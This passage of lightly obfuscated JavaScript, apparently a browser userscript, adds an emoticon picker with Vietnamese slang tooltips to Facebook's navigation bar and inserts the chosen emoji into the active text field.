        "\x63\x6C\x61\x73\x73": '_1az _1a- _2ew',
        "\x6E\x61\x6D\x65": 'Ho\xE0ng t\u1EED ba t\u01B0'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC83 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2ex',
        "\x6E\x61\x6D\x65": 'Con ch\xFAa ba l\u0103m'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC85 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2ey',
        "\x6E\x61\x6D\x65": 'S\u01A1n m\xF3ng tay ph\xE1t'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC8B ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2ez',
        "\x6E\x61\x6D\x65": 'Y\xEAu mi\u1EBFng'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC8F ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2e-',
        "\x6E\x61\x6D\x65": 'B\u1ECDn m\xECnh h\xF4n cmn nhau \u0111\xEA'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC90 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2e_',
        "\x6E\x61\x6D\x65": 'Hoa h\xF2e'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC91 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2f0',
        "\x6E\x61\x6D\x65": 'B\u1ECDn m\xECnh trao tim cmn cho nhau \u0111\xEA'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC93 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2f1',
        "\x6E\x61\x6D\x65": 'C\u1ED1 b\u1EAFt Wifi tr\xE1i tim em m\u1EDBi \u0111\u01B0\u1EE3c'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC94 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2f2',
        "\x6E\x61\x6D\x65": 'Tim t\xF4i v\u1EE1 cmnr'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC96 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2f3',
        "\x6E\x61\x6D\x65": 'Tim t\xF4i tan ch\u1EA3y cmnr'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC97 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2f4',
        "\x6E\x61\x6D\x65": 'Tr\xE1i tim 1'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC98 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2f5',
        "\x6E\x61\x6D\x65": 'Tr\xE1i tim 2'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC99 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2f6',
        "\x6E\x61\x6D\x65": 'Tr\xE1i tim 3'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC9A ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2f7',
        "\x6E\x61\x6D\x65": 'Tr\xE1i tim 4'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC9B ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2f8',
        "\x6E\x61\x6D\x65": 'Tr\xE1i tim 5'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC9C ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2f9',
        "\x6E\x61\x6D\x65": 'Tr\xE1i tim 6'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC9D ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2fa',
        "\x6E\x61\x6D\x65": 'Ch\xF3i cm tim th\xEDm l\u1EA1i'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDCA2 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2fb',
        "\x6E\x61\x6D\x65": 'M\u1EA1ng nh\u1EC7n'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDCA4 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2fc',
        "\x6E\x61\x6D\x65": 'Ng\u1EE7 th\xF4i'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDCA6 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2fd',
        "\x6E\x61\x6D\x65": 'Phun'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDCA8 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2fe',
        "\x6E\x61\x6D\x65": 'Gi\xF3 th\u1ED5i vi vu'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDCA9 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2ff',
        "\x6E\x61\x6D\x65": 'Shit'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDCAA ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2fg',
        "\x6E\x61\x6D\x65": 'C\u1EE9ng th\u1EBF n\xE0y \u01B0ng kh\xF4ng?'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDCBB ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2fh',
        "\x6E\x61\x6D\x65": 'M\xE1y t\xEDnh m\u1EDBi t\u1EADu'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDCBD ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2fi',
        "\x6E\x61\x6D\x65": 'CD nh\u1EA1c'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDCBE ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2fj',
        "\x6E\x61\x6D\x65": '\u1ED4n c\u1EE9ng'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDCBF ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2fk',
        "\x6E\x61\x6D\x65": '\u0110ia tr\u1EAFng'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDCC0 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2fl',
        "\x6E\x61\x6D\x65": 'DVD'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDCDE ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2fm',
        "\x6E\x61\x6D\x65": 'Anh nghe'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDCE0 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2fn',
        "\x6E\x61\x6D\x65": 'C\xF3 g\xEC c\u1EE9 g\u1EEDi Fax cho anh'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDCF1 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2fo',
        "\x6E\x61\x6D\x65": 'Iphone 9'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDCF2 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2fp',
        "\x6E\x61\x6D\x65": 'Iphone 9s'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDCFA ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2fq',
        "\x6E\x61\x6D\x65": '\u0110ang xem TIVI'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDD14 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2fr',
        "\x6E\x61\x6D\x65": 'Chu\xF4ng'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDE01 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2fs',
        "\x6E\x61\x6D\x65": 'Bi\u1EC3u t\u01B0\u1EE3ng vui'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDE02 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2ft',
        "\x6E\x61\x6D\x65": 'Kh\xF3c cmnr'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDE03 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2fu',
        "\x6E\x61\x6D\x65": 'C\u01B0\u1EDDi'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDE04 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2fv',
        "\x6E\x61\x6D\x65": 'Bi\u1EC3u t\u01B0\u1EE3ng vui 2'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDE06 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2fw',
        "\x6E\x61\x6D\x65": 'Bi\u1EC3u t\u01B0\u1EE3ng vui 3'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDE09 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2fx',
        "\x6E\x61\x6D\x65": 'Bi\u1EC3u t\u01B0\u1EE3ng vui 4'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDE0B ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2fy',
        "\x6E\x61\x6D\x65": 'Bi\u1EC3u t\u01B0\u1EE3ng vui 5'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDE0C ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2fz',
        "\x6E\x61\x6D\x65": 'Bi\u1EC3u t\u01B0\u1EE3ng vui 6'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDE0D ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2f-',
        "\x6E\x61\x6D\x65": 'Bi\u1EC3u t\u01B0\u1EE3ng vui 7'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDE0F ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2f_',
        "\x6E\x61\x6D\x65": 'Bi\u1EC3u t\u01B0\u1EE3ng vui 8'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDE12 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2g0',
        "\x6E\x61\x6D\x65": 'Ch\xE1n vl'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDE13 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2g1',
        "\x6E\x61\x6D\x65": 'Bi\u1EC3u t\u01B0\u1EE3ng vui 9'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDE14 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2g2',
        "\x6E\x61\x6D\x65": 'Bi\u1EC3u t\u01B0\u1EE3ng vui 10'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDE16 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2g3',
        "\x6E\x61\x6D\x65": 'Bi\u1EC3u t\u01B0\u1EE3ng vui 11'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDE18 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2g4',
        "\x6E\x61\x6D\x65": 'Bi\u1EC3u t\u01B0\u1EE3ng vui 12'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDE1A ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2g5',
        "\x6E\x61\x6D\x65": 'Bi\u1EC3u t\u01B0\u1EE3ng vui 13'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDE1C ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2g6',
        "\x6E\x61\x6D\x65": 'Bi\u1EC3u t\u01B0\u1EE3ng vui 14'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDE1D ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2g7',
        "\x6E\x61\x6D\x65": 'Bi\u1EC3u t\u01B0\u1EE3ng vui 15'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDE1E ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2g8',
        "\x6E\x61\x6D\x65": 'Bi\u1EC3u t\u01B0\u1EE3ng vui 16'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDE20 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2g9',
        "\x6E\x61\x6D\x65": 'Bi\u1EC3u t\u01B0\u1EE3ng vui 17'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDE21 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2ga',
        "\x6E\x61\x6D\x65": 'M\u01A1 ka \u0111\u1EC1, ch\u1ECB n\xF3ng r\u1ED3i \u0111\u1EA5y nh\xE9'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDE22 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2gb',
        "\x6E\x61\x6D\x65": 'Huhu...'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDE23 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2gc',
        "\x6E\x61\x6D\x65": 'Bi\u1EC3u t\u01B0\u1EE3ng vui 18'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDE24 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2gd',
        "\x6E\x61\x6D\x65": 'Bi\u1EC3u t\u01B0\u1EE3ng vui 19'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDE25 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2ge',
        "\x6E\x61\x6D\x65": 'Bi\u1EC3u t\u01B0\u1EE3ng vui 20'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDE28 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2gf',
        "\x6E\x61\x6D\x65": 'Bi\u1EC3u t\u01B0\u1EE3ng vui 21'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDE29 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2gg',
        "\x6E\x61\x6D\x65": 'Bi\u1EC3u t\u01B0\u1EE3ng vui 22'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDE2A ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2gh',
        "\x6E\x61\x6D\x65": 'Ng\u1EE7 cmnr nh\xE9'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDE2B ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2gi',
        "\x6E\x61\x6D\x65": 'H\xF4m nay m\u1EC7t vl'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDE2D ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2gj',
        "\x6E\x61\x6D\x65": 'Bi\u1EC3u t\u01B0\u1EE3ng vui 23'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDE30 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2gk',
        "\x6E\x61\x6D\x65": 'Bi\u1EC3u t\u01B0\u1EE3ng vui 24'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDE31 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2gl',
        "\x6E\x61\x6D\x65": 'Bi\u1EC3u t\u01B0\u1EE3ng vui 25'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDE32 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2gm',
        "\x6E\x61\x6D\x65": 'Bi\u1EC3u t\u01B0\u1EE3ng vui 26'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDE33 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2gn',
        "\x6E\x61\x6D\x65": 'Bi\u1EC3u t\u01B0\u1EE3ng vui 27'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDE35 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2go',
        "\x6E\x61\x6D\x65": 'Bi\u1EC3u t\u01B0\u1EE3ng vui 28'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDE37 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2gp',
        "\x6E\x61\x6D\x65": 'Bi\u1EC3u t\u01B0\u1EE3ng vui 29'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDE38 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2gq',
        "\x6E\x61\x6D\x65": 'Bi\u1EC3u t\u01B0\u1EE3ng vui 30'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDE39 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2gr',
        "\x6E\x61\x6D\x65": 'Bi\u1EC3u t\u01B0\u1EE3ng vui 31'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDE3A ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2gs',
        "\x6E\x61\x6D\x65": 'Bi\u1EC3u t\u01B0\u1EE3ng vui 32'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDE3B ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2gt',
        "\x6E\x61\x6D\x65": 'Bi\u1EC3u t\u01B0\u1EE3ng vui 33'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDE3C ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2gu',
        "\x6E\x61\x6D\x65": 'Bi\u1EC3u t\u01B0\u1EE3ng vui 34'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDE3D ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2gv',
        "\x6E\x61\x6D\x65": 'Bi\u1EC3u t\u01B0\u1EE3ng vui 35'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDE3F ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2gw',
        "\x6E\x61\x6D\x65": 'Bi\u1EC3u t\u01B0\u1EE3ng vui 36'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDE40 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2gx',
        "\x6E\x61\x6D\x65": 'Bi\u1EC3u t\u01B0\u1EE3ng vui 37'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDE4B ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2gy',
        "\x6E\x61\x6D\x65": '\u0110\u1ED1 bi\u1EBFt tay tr\xE1i hay ph\u1EA3i?'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDE4C ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2gz',
        "\x6E\x61\x6D\x65": 'Tay \u1EA3i tay ai?'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDE4D ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2g-',
        "\x6E\x61\x6D\x65": 'Bi\u1EC3u t\u01B0\u1EE3ng vui 38'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDE4F ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2g_',
        "\x6E\x61\x6D\x65": 'L\xEAn l\xE0 l\xEAn l\xEAn lu\xF4n'
    }, {
        "\x63\x68\x61\x72\x73": ' \u261D ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2h0',
        "\x6E\x61\x6D\x65": 'D\u1EB9p ra \u0111\u1EC3 anh l\xEAn'
    }, {
        "\x63\x68\x61\x72\x73": ' \u263A ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2h1',
        "\x6E\x61\x6D\x65": 'Bi\u1EC3u t\u01B0\u1EE3ng vui 39'
    }, {
        "\x63\x68\x61\x72\x73": ' \u26A1 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2h2',
        "\x6E\x61\x6D\x65": 'B\u1ECB gi\u1EADt s\xE9t cmnr'
    }, {
        "\x63\x68\x61\x72\x73": ' \u26C4 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2h3',
        "\x6E\x61\x6D\x65": 'Ng\u01B0\u1EDDi tuy\u1EBFt, Sapa m\xF9a \u0111\xF4ng 2013'
    }, {
        "\x63\x68\x61\x72\x73": ' \u270A ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2h4',
        "\x6E\x61\x6D\x65": 'N\u0103m 2014 quy\u1EBFt t\xE2m c\xF3 G\u1EA4U'
    }, {
        "\x63\x68\x61\x72\x73": ' \u270B ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2h5',
        "\x6E\x61\x6D\x65": 'Tay ph\u1EA3i nh\xE9'
    }, {
        "\x63\x68\x61\x72\x73": ' \u270C ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2h6',
        "\x6E\x61\x6D\x65": '2, l\xE0m g\u1EA5u c\u1EE7a t\u1EDB nh\xE9?'
    }, {
        "\x63\x68\x61\x72\x73": ' \u2600 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2h7',
        "\x6E\x61\x6D\x65": 'N\u1EAFng l\xEAn r\u1ED3i'
    }, {
        "\x63\x68\x61\x72\x73": ' \u2601 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2h8',
        "\x6E\x61\x6D\x65": 'M\xE2y tr\xF4i'
    }, {
        "\x63\x68\x61\x72\x73": ' \u2614 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2h9',
        "\x6E\x61\x6D\x65": 'Th\xF4i ch\u1EBFt, m\u01B0a cmnr, \xF4 \u0111\xE2u \xF4 \u0111\xE2u?'
    }, {
        "\x63\x68\x61\x72\x73": ' \u2615 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2ha',
        "\x6E\x61\x6D\x65": 'L\xE0m c\u1ED1c Cafe cho t\u1EC9nh t\xE1o, haizzz'
    }, {
        "\x63\x68\x61\x72\x73": ' \u2728 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2hb',
        "\x6E\x61\x6D\x65": 'B\u1ECB hoa m\u1EAFt cmnr'
    }, {
        "\x63\x68\x61\x72\x73": ' \u2764 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2hc',
        "\x6E\x61\x6D\x65": 'T\xF4i y\xEAu b\u1EA1n'
    }];
    var _0x3384x2 = document['activeElement'];

    function _0x3384x3(_0x3384x4) {
        var _0x3384x5 = document['createElement']('div');
        _0x3384x5['innerHTML'] = _0x3384x4;
        return _0x3384x5['firstChild'];
    };

    function _0x3384x6(_0x3384x7) {
        var _0x3384x8 = document['createElement']('div');
        var _0x3384x9 = document['createTextNode'](_0x3384x7);
        _0x3384x8['appendChild'](_0x3384x9);
        return _0x3384x8['innerHTML'];
    };

    function _0x3384xa(_0x3384xb) {
        return (_0x3384xb instanceof HTMLInputElement && _0x3384xb['type'] == 'text') || _0x3384xb instanceof HTMLTextAreaElement;
    };

    function _0x3384xc(_0x3384xd) {
        return _0x3384xd['className'] == 'openToggler';
    };

    function _0x3384xe(_0x3384xd, _0x3384xf) {
        if (_0x3384xf === undefined) {
            _0x3384xf = !_0x3384xc(_0x3384xd);
        };
        if (_0x3384xf) {
            _0x3384xd['className'] = 'openToggler';
        } else {
            _0x3384xd['removeAttribute']('class');
        };
    };

    function _0x3384x10(_0x3384x11, _0x3384x12) {
        var _0x3384x4;
        _0x3384x4 = '<li class="jewelFlyout fbJewelFlyout uiToggleFlyout">';
        _0x3384x4 += '<div class="jewelFlyout">';
        _0x3384x4 += '</div>';
        _0x3384x4 += '</li>';
        var _0x3384x13 = _0x3384x3(_0x3384x4);
        _0x3384x11['appendChild'](_0x3384x13);
        _0x3384x4 = '<div style="display: none;">';
        _0x3384x4 += '</div>';
        var _0x3384x14 = _0x3384x3(_0x3384x4);
        _0x3384x12['appendChild'](_0x3384x14);
        (function (_0x3384x14) {
            _0x3384x13['addEventListener']('click', function () {
                var _0x3384x15 = this['parentNode']['childNodes'];
                for (var _0x3384x16 = 0; _0x3384x16 < _0x3384x15['length']; _0x3384x16++) {
                    if (_0x3384x15[_0x3384x16] === this) {} else {
                        _0x3384x15[_0x3384x16]['style']['background'] = '';
                        _0x3384x15[_0x3384x16]['firstChild']['style']['color'] = '';
                    };
                };
                var _0x3384x17 = _0x3384x14['parentNode']['childNodes'];
                for (var _0x3384x18 = 0; _0x3384x18 < _0x3384x17['length']; _0x3384x18++) {
                    if (_0x3384x17[_0x3384x18] === _0x3384x14) {
                        _0x3384x14['style']['display'] = '';
                    } else {
                        _0x3384x17[_0x3384x18]['style']['display'] = 'none';
                    };
                };
            });
        })(_0x3384x14);
        return {
            "\x74\x69\x74\x6C\x65": _0x3384x13['firstChild'],
            "\x62\x6F\x64\x79": _0x3384x14
        };
    };

    function _0x3384x19(_0x3384x1, _0x3384x1a) {
        var _0x3384x4;
        _0x3384x4 = '<div style="max-height: 200px; padding-right: 15px; overflow-x: hidden; line-height: 1em;">';
        _0x3384x4 += '<div style="padding: 10px; width: 200px; font-size: 15px;">';
        _0x3384x4 += '</div>';
        _0x3384x4 += '</div>';
        var _0x3384x14 = _0x3384x3(_0x3384x4)['firstChild'];
        for (var _0x3384x1b = 0; _0x3384x1b < _0x3384x1['length']; _0x3384x1b++) {
            var _0x3384x1c = _0x3384x1[_0x3384x1b];
            if (!_0x3384x1a(_0x3384x1c)) {
                continue;
            };
            _0x3384x4 = '<span class="panelCell" style="display: inline-block; vertical-align: middle; padding: 2px;">';
            _0x3384x4 += '<a';
            _0x3384x4 += ' class="emoticon' + (_0x3384x1c['class'] !== undefined ? ' ' + _0x3384x1c['class'] : '') + '"';
            _0x3384x4 += ' style="text-decoration: inherit; color: inherit;' + (_0x3384x1c['class'] !== undefined ? ' color: transparent;' : ' width: auto;') + '"';
            _0x3384x4 += (_0x3384x1c['name'] !== undefined ? ' title="' + _0x3384x1c['name'] + '"' : '');
            _0x3384x4 += '>';
            _0x3384x4 += _0x3384x6(_0x3384x1c['chars']);
            _0x3384x4 += '</a>';
            _0x3384x4 += '</span>';
            var _0x3384x1d = _0x3384x3(_0x3384x4);
            _0x3384x14['appendChild'](_0x3384x1d);
            var _0x3384x1e = _0x3384x1d['firstChild'];
            (function (_0x3384x1c) {
                _0x3384x1e['addEventListener']('click', function () {
                    if (_0x3384xa(_0x3384x2)) {
                        _0x3384x2['focus']();
                        var _0x3384x1f = _0x3384x1c['chars'];
                        var _0x3384x20 = _0x3384x2['value'];
                        var _0x3384x21 = _0x3384x2['selectionStart'];
                        var _0x3384x22 = _0x3384x2['selectionEnd'];
                        _0x3384x2['value'] = _0x3384x20['substring'](0, _0x3384x21) + _0x3384x1f + _0x3384x20['substring'](_0x3384x22);
                        _0x3384x2['setSelectionRange'](_0x3384x21 + _0x3384x1f['length'], _0x3384x21 + _0x3384x1f['length']);
                    };
                    openFlyoutCommand = false;
                });
            })(_0x3384x1c);
        };
        return _0x3384x14['parentNode'];
    };
    var _0x3384x4;
    _0x3384x4 = '<li class="navItem middleItem notifNegativeBase">';
    _0x3384x4 += '<div class="fbJewel">';
    _0x3384x4 += '<a class="navLink" title="Icon Facebook 2014">';
    _0x3384x4 += '<span style="vertical-align: middle;"><img src="http://static.ak.fbcdn.net/rsrc.php/v1/yY/r/7OqExvAe82o.gif"></img> Icon Facebook</span>';
    _0x3384x4 += '</a>';
    _0x3384x4 += '<div>';
    _0x3384x4 += '<div class="emoticonsPanel fbJewelFlyout uiToggleFlyout" style="z-index: 1; width: auto;">';
    _0x3384x4 += '<div class="jewelBeeperHeader">';
    _0x3384x4 += '<div class="beeperNubWrapper">';
    _0x3384x4 += '<div class="beeperNub" style="left: 4px;"></div>';
    _0x3384x4 += '</div>';
    _0x3384x4 += '</div>';
    _0x3384x4 += '<ul style="display: text-align: center;">';
    _0x3384x4 += '</ul>';
    _0x3384x4 += '<div>';
    _0x3384x4 += '</div>';
    _0x3384x4 += '<div class="jewelFooter">';
    _0x3384x4 += '<a class="jewelFooter" href="https://www.facebook.com/tapsongphu.biz" target="_blank">Tập Sống Phũ</a>';
    _0x3384x4 += '</div>';
    _0x3384x4 += '</div>';
    _0x3384x4 += '</div>';
    _0x3384x4 += '</div>';
    _0x3384x4 += '</li>';
    var _0x3384x23 = _0x3384x3(_0x3384x4);
    var _0x3384x24 = document['querySelector']('#pageNav');
    _0x3384x24['insertBefore'](_0x3384x23, _0x3384x24['firstChild']);
    _0x3384x23['addEventListener']('click', function () {
        if (_0x3384xa(_0x3384x2)) {
            _0x3384x2['focus']();
        };
        openFlyoutCommand = undefined;
    }, true);
    var _0x3384x25 = _0x3384x23['firstChild']['firstChild'];
    var _0x3384xd = _0x3384x25['nextSibling'];
    var _0x3384x11 = _0x3384xd['firstChild']['childNodes'][1];
    var _0x3384x12 = _0x3384x11['nextSibling'];
    _0x3384x25['addEventListener']('click', function () {
        openFlyoutCommand = !_0x3384xc(_0x3384xd);
    });
    var _0x3384x26 = _0x3384x10(_0x3384x11, _0x3384x12);
    _0x3384x26['title']['click']();
    _0x3384x26['body']['appendChild'](_0x3384x19(_0x3384x1, function (_0x3384x1c) {
        if (_0x3384x1c['class'] === undefined) {
            return false;
        };
        if (_0x3384x1c['chars']['length'] == 2) {
            return false;
        };
        return true;
    }));
    document['addEventListener']('click', function () {
        _0x3384x2 = document['activeElement'];
        if (openFlyoutCommand !== undefined) {
            _0x3384xe(_0x3384xd, openFlyoutCommand);
        };
        openFlyoutCommand = false;
    });
})();
//*
